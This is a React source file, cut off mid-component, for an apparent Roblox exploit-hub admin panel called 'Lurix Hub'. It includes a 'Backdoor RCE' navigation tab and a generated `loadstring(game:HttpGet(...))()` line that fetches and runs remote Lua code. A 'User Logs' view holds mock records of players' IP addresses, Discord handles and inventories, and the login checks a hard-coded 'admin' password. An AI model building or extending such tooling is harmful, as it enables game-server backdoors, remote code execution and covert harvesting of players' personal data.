'use client';
import { useState, useEffect, useMemo } from 'react';

// ─── MOCK EDITOR SHIM (replace with real Monaco in Next.js) ─────────────────
const Editor = ({ value, onChange, height }) => (
  <textarea
    value={value}
    onChange={(e) => onChange && onChange(e.target.value)}
    style={{ height, width: '100%', background: '#0d0f14', color: '#e2e8f0', border: 'none', resize: 'none', padding: '12px', fontFamily: 'monospace', fontSize: 12, outline: 'none', borderRadius: 0 }}
  />
);

// ─── ICONS ───────────────────────────────────────────────────────────────────
const Icon = {
  Shield: () => (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
    </svg>
  ),
  Code: () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>
    </svg>
  ),
  Zap: () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
    </svg>
  ),
  Users: () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/>
      <path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/>
    </svg>
  ),
  Settings: () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="3"/>
      <path d="M19.07 4.93l-1.41 1.41M4.93 4.93l1.41 1.41M20 12h-2M4 12H2M19.07 19.07l-1.41-1.41M4.93 19.07l1.41-1.41M12 20v-2M12 4V2"/>
    </svg>
  ),
  Home: () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/>
    </svg>
  ),
  Copy: () => (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
    </svg>
  ),
  Check: () => (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="20 6 9 17 4 12"/>
    </svg>
  ),
  Trash: () => (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/>
    </svg>
  ),
  Plus: () => (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>
    </svg>
  ),
  X: () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
    </svg>
  ),
  LogOut: () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/>
    </svg>
  ),
  Target: () => (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/>
    </svg>
  ),
  Package: () => (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <line x1="16.5" y1="9.4" x2="7.5" y2="4.21"/><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/>
    </svg>
  ),
  Eye: () => (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
    </svg>
  ),
  EyeOff: () => (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>
    </svg>
  ),
  RefreshCw: () => (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/>
      <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/>
    </svg>
  ),
  Menu: () => (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/>
    </svg>
  ),
  ChevronRight: () => (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="9 18 15 12 9 6"/>
    </svg>
  ),
};

// ─── MOCK DATA ────────────────────────────────────────────────────────────────
const MOCK_SCRIPTS = [
  { id: 1, title: 'Stand Upright Main', slug: 'su-main', content: '-- Stand Upright Main\nprint("Loaded")\n', status: 'working', created_at: new Date().toISOString() },
  { id: 2, title: 'Auto Farm v2', slug: 'auto-farm-v2', content: '-- Auto Farm\n', status: 'working', created_at: new Date().toISOString() },
  { id: 3, title: 'ESP Module', slug: 'esp-module', content: '-- ESP\n', status: 'updating', created_at: new Date().toISOString() },
  { id: 4, title: 'Old Bypass', slug: 'old-bypass', content: '-- patched\n', status: 'patched', created_at: new Date().toISOString() },
];

const MOCK_LOGS = [
  { id: 1, roblox_username: 'xXProPlayer99', roblox_id: '3847291', ip_address: '103.21.44.5', discord_user: 'xpro#0001', executor: 'KRNL', is_vip: false, place_id: '6456360006', job_id: 'abc123def456', created_at: new Date().toISOString(), stand_storage: JSON.stringify({ slots: [{ slot: 1, name: 'Crazy Diamond', attribute: 'Vampiric', tier: 'S+', guid: '8554099967-42d08ba', is_empty: false, raw_name: 'CrazyDiamond' }, { slot: 2, name: 'Empty', attribute: 'None', tier: '-', guid: '', is_empty: true }], spec_storage: 'Hamon' }), inventory_data: JSON.stringify([{ name: 'Rokakaka', type: 'Consumable', count: 12 }, { name: 'Stand Arrow', type: 'Evolution', count: 3 }]) },
  { id: 2, roblox_username: 'CoolDev2024', roblox_id: '9182736', ip_address: '45.67.89.10', discord_user: 'cooldev#9999', executor: 'Synapse X', is_vip: true, place_id: null, job_id: null, created_at: new Date(Date.now() - 3600000).toISOString(), stand_storage: null, inventory_data: null },
];

// ─── TOKENS ───────────────────────────────────────────────────────────────────
const T = {
  bg: '#060810',
  surface: '#0c0e1a',
  surfaceAlt: '#10132a',
  border: 'rgba(110,150,255,0.12)',
  borderHover: 'rgba(110,150,255,0.35)',
  accent: '#6E96FF',
  accentGlow: 'rgba(110,150,255,0.25)',
  accentDim: 'rgba(110,150,255,0.08)',
  yellow: '#f5c542',
  yellowGlow: 'rgba(245,197,66,0.2)',
  green: '#34d399',
  red: '#f87171',
  purple: '#a78bfa',
  text: '#e2e8f0',
  textMuted: '#64748b',
  textDim: '#334155',
};

// ─── CSS-IN-JS STYLES ─────────────────────────────────────────────────────────
const css = {
  root: {
    minHeight: '100vh',
    background: T.bg,
    color: T.text,
    fontFamily: "'Inter', 'SF Pro Display', -apple-system, sans-serif",
    WebkitFontSmoothing: 'antialiased',
    overflowX: 'hidden',
  },
  // Glowing grid background
  gridBg: {
    position: 'fixed',
    inset: 0,
    backgroundImage: `
      linear-gradient(rgba(110,150,255,0.03) 1px, transparent 1px),
      linear-gradient(90deg, rgba(110,150,255,0.03) 1px, transparent 1px)
    `,
    backgroundSize: '40px 40px',
    pointerEvents: 'none',
    zIndex: 0,
  },
  gradientOrb: (color, x, y, size = 400) => ({
    position: 'fixed',
    left: x, top: y,
    width: size, height: size,
    background: `radial-gradient(circle, ${color} 0%, transparent 70%)`,
    pointerEvents: 'none',
    zIndex: 0,
    filter: 'blur(60px)',
  }),
  layout: {
    position: 'relative',
    zIndex: 1,
    maxWidth: 1440,
    margin: '0 auto',
    display: 'flex',
    minHeight: '100vh',
  },
  // Sidebar
  sidebar: (collapsed) => ({
    width: collapsed ? 64 : 240,
    minWidth: collapsed ? 64 : 240,
    background: T.surface,
    borderRight: `1px solid ${T.border}`,
    display: 'flex',
    flexDirection: 'column',
    transition: 'width 0.25s cubic-bezier(0.4,0,0.2,1), min-width 0.25s cubic-bezier(0.4,0,0.2,1)',
    overflow: 'hidden',
    position: 'sticky',
    top: 0,
    height: '100vh',
  }),
  sidebarLogo: {
    padding: '20px 16px',
    borderBottom: `1px solid ${T.border}`,
    display: 'flex',
    alignItems: 'center',
    gap: 12,
    minHeight: 64,
  },
  logoIcon: {
    width: 36,
    height: 36,
    minWidth: 36,
    background: `linear-gradient(135deg, ${T.accent}, #4a6cf7)`,
    borderRadius: 10,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    fontWeight: 900,
    fontSize: 14,
    color: '#fff',
    boxShadow: `0 0 20px ${T.accentGlow}`,
  },
  logoText: {
    fontWeight: 900,
    fontSize: 15,
    letterSpacing: '0.08em',
    color: T.text,
    whiteSpace: 'nowrap',
    overflow: 'hidden',
  },
  navItem: (active) => ({
    display: 'flex',
    alignItems: 'center',
    gap: 12,
    padding: '10px 16px',
    margin: '2px 8px',
    borderRadius: 10,
    cursor: 'pointer',
    transition: 'all 0.15s',
    background: active ? `linear-gradient(135deg, ${T.accentDim}, rgba(74,108,247,0.08))` : 'transparent',
    border: `1px solid ${active ? T.borderHover : 'transparent'}`,
    color: active ? T.accent : T.textMuted,
    fontWeight: active ? 700 : 500,
    fontSize: 13,
    whiteSpace: 'nowrap',
    overflow: 'hidden',
    position: 'relative',
  }),
  navIcon: {
    minWidth: 32,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
  },
  // Main content
  main: {
    flex: 1,
    display: 'flex',
    flexDirection: 'column',
    minWidth: 0,
    overflow: 'hidden',
  },
  topbar: {
    height: 64,
    background: `${T.surface}cc`,
    backdropFilter: 'blur(20px)',
    WebkitBackdropFilter: 'blur(20px)',
    borderBottom: `1px solid ${T.border}`,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    padding: '0 24px',
    position: 'sticky',
    top: 0,
    zIndex: 50,
  },
  content: {
    padding: '24px',
    flex: 1,
    overflowY: 'auto',
  },
  // Cards
  card: (glow) => ({
    background: T.surface,
    border: `1px solid ${glow ? T.borderHover : T.border}`,
    borderRadius: 16,
    overflow: 'hidden',
    boxShadow: glow ? `0 0 30px ${T.accentGlow}` : '0 4px 24px rgba(0,0,0,0.4)',
  }),
  cardInner: {
    padding: '20px 24px',
  },
  cardHeader: {
    padding: '16px 20px',
    borderBottom: `1px solid ${T.border}`,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
  },
  cardLabel: {
    fontSize: 11,
    fontWeight: 800,
    letterSpacing: '0.1em',
    color: T.textMuted,
    textTransform: 'uppercase',
  },
  // Stat cards
  statCard: (color) => ({
    background: T.surface,
    border: `1px solid ${color}22`,
    borderRadius: 14,
    padding: '16px 20px',
    position: 'relative',
    overflow: 'hidden',
  }),
  statGlow: (color) => ({
    position: 'absolute',
    top: 0, right: 0,
    width: 80, height: 80,
    background: `radial-gradient(circle, ${color}33 0%, transparent 70%)`,
    borderRadius: '50%',
  }),
  // Input
  input: {
    width: '100%',
    background: 'rgba(0,0,0,0.4)',
    border: `1px solid ${T.border}`,
    borderRadius: 10,
    padding: '10px 14px',
    color: T.text,
    fontSize: 13,
    outline: 'none',
    fontFamily: 'inherit',
    transition: 'border-color 0.15s',
    boxSizing: 'border-box',
  },
  // Buttons
  btn: (variant = 'primary') => {
    const v = {
      primary: { bg: T.accent, color: '#000', shadow: `0 0 20px ${T.accentGlow}` },
      secondary: { bg: T.accentDim, color: T.accent, shadow: 'none', border: `1px solid ${T.borderHover}` },
      danger: { bg: 'rgba(248,113,113,0.1)', color: T.red, shadow: 'none', border: '1px solid rgba(248,113,113,0.3)' },
      yellow: { bg: T.yellowGlow, color: T.yellow, shadow: 'none', border: `1px solid rgba(245,197,66,0.3)` },
      ghost: { bg: 'transparent', color: T.textMuted, shadow: 'none', border: `1px solid ${T.border}` },
      purple: { bg: 'rgba(167,139,250,0.1)', color: T.purple, shadow: 'none', border: '1px solid rgba(167,139,250,0.3)' },
      green: { bg: 'rgba(52,211,153,0.1)', color: T.green, shadow: 'none', border: '1px solid rgba(52,211,153,0.3)' },
    }[variant];
    return {
      display: 'inline-flex',
      alignItems: 'center',
      gap: 6,
      padding: '9px 16px',
      borderRadius: 10,
      fontWeight: 700,
      fontSize: 12,
      cursor: 'pointer',
      background: v.bg,
      color: v.color,
      boxShadow: v.shadow,
      border: v.border || 'none',
      transition: 'all 0.15s',
      whiteSpace: 'nowrap',
      letterSpacing: '0.02em',
    };
  },
  // Badge
  badge: (color) => ({
    display: 'inline-flex',
    alignItems: 'center',
    gap: 4,
    padding: '3px 9px',
    borderRadius: 999,
    fontSize: 10,
    fontWeight: 800,
    letterSpacing: '0.06em',
    textTransform: 'uppercase',
    background: `${color}18`,
    color: color,
    border: `1px solid ${color}33`,
  }),
  // Table
  table: {
    width: '100%',
    borderCollapse: 'collapse',
    fontSize: 12,
  },
  th: {
    padding: '11px 14px',
    textAlign: 'left',
    fontSize: 10,
    fontWeight: 800,
    letterSpacing: '0.08em',
    color: T.textMuted,
    textTransform: 'uppercase',
    borderBottom: `1px solid ${T.border}`,
    background: `${T.surfaceAlt}99`,
    whiteSpace: 'nowrap',
  },
  td: {
    padding: '12px 14px',
    borderBottom: `1px solid ${T.border}`,
    verticalAlign: 'middle',
  },
  // Script list item
  scriptItem: (active) => ({
    padding: '12px 14px',
    borderRadius: 12,
    cursor: 'pointer',
    border: `1px solid ${active ? T.borderHover : T.border}`,
    background: active ? T.accentDim : 'rgba(0,0,0,0.2)',
    transition: 'all 0.15s',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    gap: 8,
  }),
  // Modal overlay
  overlay: {
    position: 'fixed',
    inset: 0,
    background: 'rgba(0,0,0,0.85)',
    backdropFilter: 'blur(12px)',
    WebkitBackdropFilter: 'blur(12px)',
    zIndex: 9999,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    padding: 16,
  },
  modal: {
    background: T.surface,
    border: `1px solid ${T.borderHover}`,
    borderRadius: 20,
    width: '100%',
    maxWidth: 680,
    maxHeight: '88vh',
    display: 'flex',
    flexDirection: 'column',
    boxShadow: `0 0 60px ${T.accentGlow}`,
    overflow: 'hidden',
  },
};

// ─── HELPERS ──────────────────────────────────────────────────────────────────
const statusColor = (s) => ({
  working: T.green,
  updating: T.yellow,
  patched: T.red,
}[s] || T.textMuted);

const statusLabel = (s) => ({
  working: 'Active',
  updating: 'Update',
  patched: 'Patched',
}[s] || s);

const tierColor = (tier) => ({
  'S+': T.yellow, 'GOD': T.yellow,
  'S': T.purple,
  'A': T.accent,
  'B': T.green,
}[String(tier).toUpperCase()] || T.textMuted);

const CopyBtn = ({ text, label = 'Copy', labelCopied = 'Copied!', variant = 'secondary', small }) => {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button
      onClick={copy}
      style={{ ...css.btn(copied ? 'green' : variant), padding: small ? '6px 12px' : undefined, fontSize: small ? 11 : undefined }}
    >
      {copied ? <Icon.Check /> : <Icon.Copy />}
      {copied ? labelCopied : label}
    </button>
  );
};

const Divider = ({ style }) => <div style={{ height: 1, background: T.border, ...style }} />;

const SectionTitle = ({ children, accent }) => (
  <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 20 }}>
    <div style={{ width: 3, height: 20, background: accent || `linear-gradient(180deg, ${T.accent}, #4a6cf7)`, borderRadius: 2 }} />
    <span style={{ fontWeight: 800, fontSize: 13, letterSpacing: '0.06em', textTransform: 'uppercase', color: T.text }}>
      {children}
    </span>
  </div>
);

// ─── LOGIN PAGE ───────────────────────────────────────────────────────────────
const LoginPage = ({ onLogin }) => {
  const [pw, setPw] = useState('');
  const [show, setShow] = useState(false);
  const [loading, setLoading] = useState(false);

  const submit = async (e) => {
    e.preventDefault();
    setLoading(true);
    await new Promise(r => setTimeout(r, 800));
    if (pw === 'admin') { onLogin(pw); }
    else { alert('Wrong password.'); }
    setLoading(false);
  };

  return (
    <div style={{ ...css.root, display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '100vh', position: 'relative' }}>
      <div style={css.gridBg} />
      <div style={css.gradientOrb('rgba(110,150,255,0.15)', '20%', '20%', 500)} />
      <div style={css.gradientOrb('rgba(74,108,247,0.1)', '60%', '60%', 400)} />

      <div style={{ position: 'relative', zIndex: 1, width: '100%', maxWidth: 380, padding: '0 16px' }}>
        {/* Logo */}
        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 40 }}>
          <div style={{ ...css.logoIcon, width: 56, height: 56, borderRadius: 16, fontSize: 22, marginBottom: 16 }}>L</div>
          <div style={{ fontWeight: 900, fontSize: 24, letterSpacing: '0.12em', color: T.text }}>LURIX HUB</div>
          <div style={{ fontSize: 12, color: T.textMuted, marginTop: 4, fontWeight: 500 }}>Admin Control Panel</div>
        </div>

        <div style={{ ...css.card(true), borderRadius: 20 }}>
          <div style={{ padding: '32px 28px' }}>
            <div style={{ fontSize: 11, fontWeight: 800, color: T.textMuted, letterSpacing: '0.1em', textTransform: 'uppercase', marginBottom: 16 }}>
              Authentication Required
            </div>

            <form onSubmit={submit}>
              <div style={{ position: 'relative', marginBottom: 16 }}>
                <input
                  type={show ? 'text' : 'password'}
                  placeholder="Enter admin password"
                  value={pw}
                  onChange={e => setPw(e.target.value)}
                  style={{ ...css.input, paddingRight: 42, fontFamily: 'monospace', fontSize: 14 }}
                  onFocus={e => e.target.style.borderColor = T.accent}
                  onBlur={e => e.target.style.borderColor = T.border.replace(')', '')}
                />
                <button
                  type="button"
                  onClick={() => setShow(!show)}
                  style={{ position: 'absolute', right: 12, top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', cursor: 'pointer', color: T.textMuted, display: 'flex', padding: 0 }}
                >
                  {show ? <Icon.EyeOff /> : <Icon.Eye />}
                </button>
              </div>

              <button
                type="submit"
                disabled={loading || !pw}
                style={{
                  ...css.btn('primary'),
                  width: '100%',
                  justifyContent: 'center',
                  padding: '13px 24px',
                  fontSize: 13,
                  borderRadius: 12,
                  opacity: loading || !pw ? 0.5 : 1,
                  fontWeight: 900,
                  letterSpacing: '0.08em',
                }}
              >
                <Icon.Shield />
                {loading ? 'Authenticating...' : 'LOGIN'}
              </button>
            </form>
          </div>

          <div style={{ padding: '14px 28px', borderTop: `1px solid ${T.border}`, background: 'rgba(0,0,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <div style={{ ...css.badge(T.green) }}>
              <div style={{ width: 6, height: 6, borderRadius: '50%', background: T.green, animation: 'pulse 2s infinite' }} />
              System Online
            </div>
            <span style={{ fontSize: 11, color: T.textMuted }}>v3.0 RCE</span>
          </div>
        </div>

        <div style={{ textAlign: 'center', marginTop: 20, fontSize: 11, color: T.textDim }}>
           <code style={{ color: T.accent }}></code>
        </div>
      </div>

      <style>{`
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
        @keyframes fadeIn { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:none} }
        @keyframes spin { to{transform:rotate(360deg)} }
        * { box-sizing: border-box; }
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(110,150,255,0.3); border-radius: 2px; }
        input::placeholder { color: #334155; }
        textarea::placeholder { color: #334155; }
        select option { background: #0c0e1a; }
      `}</style>
    </div>
  );
};

// ─── NAV CONFIG ───────────────────────────────────────────────────────────────
const NAV = [
  { id: 'custom_home', label: 'Home Config', icon: Icon.Home, color: T.accent },
  { id: 'scripts', label: 'Scripts', icon: Icon.Code, color: T.accent },
  { id: 'backdoor', label: 'Backdoor RCE', icon: Icon.Zap, color: T.yellow },
  { id: 'user_logs', label: 'User Logs', icon: Icon.Users, color: T.accent },
  { id: 'settings', label: 'Settings', icon: Icon.Settings, color: T.accent },
];

// ─── SCRIPTS TAB ─────────────────────────────────────────────────────────────
const ScriptsTab = ({ isMobile }) => {
  const [scripts, setScripts] = useState(MOCK_SCRIPTS);
  const [selected, setSelected] = useState(MOCK_SCRIPTS[0]);
  const [code, setCode] = useState(MOCK_SCRIPTS[0].content);
  const [slug, setSlug] = useState(MOCK_SCRIPTS[0].slug);
  const [title, setTitle] = useState(MOCK_SCRIPTS[0].title);
  const [status, setStatus] = useState(MOCK_SCRIPTS[0].status);
  const [search, setSearch] = useState('');
  const [filter, setFilter] = useState('all');
  const [saving, setSaving] = useState(false);
  const [view, setView] = useState('list'); // 'list' | 'editor' on mobile

  const domain = typeof window !== 'undefined' ? window.location.origin : 'https://lurixhub.vercel.app';
  const loadstring = `loadstring(game:HttpGet("${domain}/api/raw/${slug}"))()`;

  const filtered = useMemo(() => scripts.filter(s => {
    const q = search.toLowerCase();
    const match = !q || s.title.toLowerCase().includes(q) || s.slug.includes(q);
    const st = filter === 'all' || s.status === filter;
    return match && st;
  }), [scripts, search, filter]);

  const select = (s) => { setSelected(s); setCode(s.content); setSlug(s.slug); setTitle(s.title); setStatus(s.status); if (isMobile) setView('editor'); };
  const save = async () => { setSaving(true); await new Promise(r => setTimeout(r, 600)); setSaving(false); };
  const create = () => {
    const t = prompt('Script title:'); if (!t) return;
    const sl = prompt('Slug:'); if (!sl) return;
    const ns = { id: Date.now(), title: t, slug: sl, content: `-- ${t}\n`, status: 'working', created_at: new Date().toISOString() };
    setScripts(p => [ns, ...p]); select(ns);
  };
  const del = (id) => { if (!confirm('Delete script?')) return; setScripts(p => p.filter(s => s.id !== id)); setSelected(null); };

  const FILTERS = [
    { v: 'all', label: 'All', color: T.text },
    { v: 'working', label: 'Active', color: T.green },
    { v: 'updating', label: 'Update', color: T.yellow },
    { v: 'patched', label: 'Patched', color: T.red },
  ];

  return (
    <div style={{ display: 'flex', gap: 20, height: '100%', flexDirection: isMobile ? 'column' : 'row' }}>
      {/* Sidebar list */}
      {(!isMobile || view === 'list') && (
        <div style={{ width: isMobile ? '100%' : 280, minWidth: isMobile ? undefined : 260, display: 'flex', flexDirection: 'column', gap: 12 }}>
          <button onClick={create} style={{ ...css.btn('primary'), justifyContent: 'center', width: '100%', padding: '11px', fontSize: 12, fontWeight: 800 }}>
            <Icon.Plus /> New Script
          </button>

          <div style={{ position: 'relative' }}>
            <input
              value={search}
              onChange={e => setSearch(e.target.value)}
              placeholder="Search scripts..."
              style={{ ...css.input, paddingLeft: 14 }}
              onFocus={e => e.target.style.borderColor = T.accent}
              onBlur={e => e.target.style.borderColor = T.border}
            />
          </div>

          <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
            {FILTERS.map(f => (
              <button
                key={f.v}
                onClick={() => setFilter(f.v)}
                style={{
                  ...css.btn('ghost'),
                  padding: '5px 10px',
                  fontSize: 10,
                  fontWeight: 800,
                  color: filter === f.v ? f.color : T.textMuted,
                  borderColor: filter === f.v ? `${f.color}44` : T.border,
                  background: filter === f.v ? `${f.color}10` : 'transparent',
                }}
              >
                {f.label}
              </button>
            ))}
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: 6, maxHeight: isMobile ? 280 : 'calc(100vh - 260px)', overflowY: 'auto', paddingRight: 2 }}>
            {filtered.map(s => (
              <div key={s.id} onClick={() => select(s)} style={css.scriptItem(selected?.id === s.id)}>
                <div style={{ minWidth: 0, flex: 1 }}>
                  <div style={{ fontWeight: 700, fontSize: 12, color: T.text, marginBottom: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.title}</div>
                  <div style={{ fontSize: 10, fontFamily: 'monospace', color: T.accent, opacity: 0.7, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>/api/raw/{s.slug}</div>
                </div>
                <div style={css.badge(statusColor(s.status))}>{statusLabel(s.status)}</div>
              </div>
            ))}
            {filtered.length === 0 && (
              <div style={{ textAlign: 'center', padding: '32px 16px', color: T.textMuted, fontSize: 12 }}>No scripts found</div>
            )}
          </div>
        </div>
      )}

      {/* Editor panel */}
      {(!isMobile || view === 'editor') && selected && (
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: 16, minWidth: 0 }}>
          {isMobile && (
            <button onClick={() => setView('list')} style={{ ...css.btn('ghost'), alignSelf: 'flex-start' }}>
              ← Back to list
            </button>
          )}

          {/* Loadstring */}
          <div style={{ ...css.card(true), borderRadius: 14 }}>
            <div style={{ padding: '14px 18px' }}>
              <div style={{ fontSize: 10, fontWeight: 800, color: T.textMuted, textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 10 }}>Execution Loadstring</div>
              <div style={{ background: 'rgba(0,0,0,0.5)', borderRadius: 8, padding: '10px 14px', fontFamily: 'monospace', fontSize: 11, color: '#94a3b8', wordBreak: 'break-all', marginBottom: 10, border: `1px solid ${T.border}` }}>
                {loadstring}
              </div>
              <CopyBtn text={loadstring} label="Copy Loadstring" />
            </div>
          </div>

          {/* Meta fields */}
          <div style={{ display: 'grid', gridTemplateColumns: isMobile ? '1fr 1fr' : '1fr 1fr auto', gap: 12 }}>
            <div>
              <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Title</div>
              <input value={title} onChange={e => setTitle(e.target.value)} style={css.input}
                onFocus={e => e.target.style.borderColor = T.accent} onBlur={e => e.target.style.borderColor = T.border} />
            </div>
            <div>
              <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Slug</div>
              <input value={slug} onChange={e => setSlug(e.target.value)} style={{ ...css.input, fontFamily: 'monospace', color: T.accent }}
                onFocus={e => e.target.style.borderColor = T.accent} onBlur={e => e.target.style.borderColor = T.border} />
            </div>
            <div>
              <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Status</div>
              <select value={status} onChange={e => setStatus(e.target.value)}
                style={{ ...css.input, color: statusColor(status), fontWeight: 700, cursor: 'pointer' }}
                onFocus={e => e.target.style.borderColor = T.accent} onBlur={e => e.target.style.borderColor = T.border}>
                <option value="working">Working</option>
                <option value="updating">Updating</option>
                <option value="patched">Patched</option>
              </select>
            </div>
          </div>

          {/* Toolbar */}
          <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'center', justifyContent: 'space-between' }}>
            <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
              <button onClick={save} disabled={saving} style={{ ...css.btn('primary'), opacity: saving ? 0.6 : 1 }}>
                {saving ? 'Saving...' : '↑ Save'}
              </button>
              <button style={css.btn('purple')}>Duplicate</button>
              <label style={{ ...css.btn('ghost'), cursor: 'pointer' }}>
                Upload .lua
                <input type="file" accept=".lua,.txt" style={{ display: 'none' }} onChange={e => { const f = e.target.files[0]; if (!f) return; const r = new FileReader(); r.onload = ev => setCode(ev.target.result); r.readAsText(f); }} />
              </label>
              <button onClick={() => setCode('')} style={css.btn('ghost')}>Clear</button>
            </div>
            <button onClick={() => del(selected.id)} style={css.btn('danger')}>
              <Icon.Trash /> Delete
            </button>
          </div>

          {/* Code editor */}
